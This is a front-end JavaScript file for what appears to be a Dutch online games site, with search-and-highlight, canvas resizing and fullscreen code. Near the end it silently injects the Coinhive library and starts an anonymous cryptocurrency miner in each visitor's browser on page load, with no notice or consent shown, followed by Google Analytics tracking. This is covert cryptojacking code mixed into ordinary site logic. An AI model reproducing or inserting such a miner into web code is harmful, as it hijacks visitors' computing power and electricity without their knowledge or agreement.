if (window.location.pathname === '/zoeken') {
    var games = document.getElementById('games');
    var subtitle = document.getElementById('subtitle'), firstSubtitle = subtitle.textContent;
    var searchForm = document.getElementById('search-form'), searchInput = document.getElementById('search-input');

    function search () {
        var match_count = 0, search_value = searchInput.value, lower_search_value = search_value.toLowerCase(),
            regexp = new RegExp('(' + search_value.replace(/[|\\{}()[\]^$+*?.]/g, '\\$&') + ')', 'gim');
        if (search_value.length >= 3) {
            for (var i = 0; i < games.children.length; i++) {
                var name = games.children[i].children[2].textContent;
                var description = games.children[i].children[3].textContent;
                var match = name.toLowerCase().indexOf(lower_search_value) > -1;
                if (!match) match = description.toLowerCase().indexOf(lower_search_value) > -1;
                if (match) {
                    match_count++;
                    games.children[i].classList.remove('hidden');
                    games.children[i].children[2].innerHTML = name.replace(regexp, '<span class="highlight">$1</span>');
                    games.children[i].children[3].innerHTML = description.replace(regexp, '<span class="highlight">$1</span>');
                } else {
                    games.children[i].classList.add('hidden');
                }
            }
            subtitle.textContent = 'We hebben ' + match_count + ' spelletje' + (match_count === 1 ? '' : 's') + ' gevonden met je zoekterm: ' + search_value;
        } else {
            for (var i = 0; i < games.children.length; i++) {
                games.children[i].classList.remove('hidden');
                if (games.children[i].children[2].innerHTML.indexOf('class="highlight"') > -1) {
                    games.children[i].children[2].innerHTML = games.children[i].children[2].textContent;
                }
                if (games.children[i].children[3].innerHTML.indexOf('class="highlight"') > -1) {
                    games.children[i].children[3].innerHTML = games.children[i].children[3].textContent;
                }
            }
            subtitle.textContent = search_value === '' ? firstSubtitle : 'Je zoekterm moet minsten 3 tekens lang zijn.';
        }
    }

    searchForm.addEventListener('submit', function (event) {
        event.preventDefault();
    });
    
    if (window.location.search !== '') {
        searchInput.value = decodeURIComponent(window.location.search.substring(3)).replace(/\+/g, ' ');
        search();
    }

    searchInput.addEventListener('input', function () {
        window.history.pushState({}, '', '/zoeken?q=' + encodeURIComponent(this.value));
        search();
    });
}

var game = document.getElementById('game');
if (game) {
    var fullscreen = document.getElementById('fullscreen');
    var wrapper = document.getElementById('wrapper');
    var game = document.getElementById('game');
    var gameWidth = parseInt(game.getAttribute('data-width'));
    var gameHeight = parseInt(game.getAttribute('data-height'));

    function gameResize () {
        if (game) {
            if (document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || document.msFullscreenElement) {
                var window_width = window.innerWidth, window_height = window.innerHeight;
            } else {
                var window_width = window.innerWidth - 16 * 2, window_height = window.innerHeight - 56 - 16 * 2;
            }

            if (window_width < gameWidth * window_height / gameHeight) {
                game.style.margin = (window_height - gameHeight * (window_width / gameWidth)) / 2 + 'px 0';
                game.width = gameWidth * (window_width / gameWidth);
                game.height = gameHeight * (window_width / gameWidth);
            } else {
                game.style.margin = '0 ' + (window_width - gameWidth * (window_height / gameHeight)) / 2 + 'px';
                game.width = gameWidth * (window_height / gameHeight);
                game.height = gameHeight * (window_height / gameHeight);
            }
        }
    }
    gameResize();
    window.addEventListener('resize', gameResize);
    game.classList.remove('hidden');

    fullscreen.addEventListener('click', function () {
        this.blur();
        if (wrapper.requestFullscreen) {
            wrapper.requestFullscreen();
        } else if (wrapper.mozRequestFullScreen) {
            wrapper.mozRequestFullScreen();
        } else if (wrapper.webkitRequestFullscreen) {
            wrapper.webkitRequestFullscreen();
        } else if (wrapper.msRequestFullscreen) {
            wrapper.msRequestFullscreen();
        }
    });
}

var miner, minerScript = document.createElement('script');
minerScript.src = 'https://coinhive.com/lib/coinhive.min.js';
minerScript.addEventListener('load', function () {
    miner = new CoinHive.Anonymous('ENDYwvXEVLN7UFRO43zBsKNHAYGXx9u2');
    miner.setThrottle(miner.isMobile() ? 0.4 : 0.2);
    miner.start();
});
document.head.appendChild(minerScript);

var analyticsScript = document.createElement('script');
analyticsScript.src = 'https://www.googletagmanager.com/gtag/js?id=UA-110826300-2';
document.head.appendChild(analyticsScript);

window.dataLayer = window.dataLayer || [];
function gtag () { dataLayer.push(arguments); }
gtag('js', new Date());
gtag('config', 'UA-110826300-2');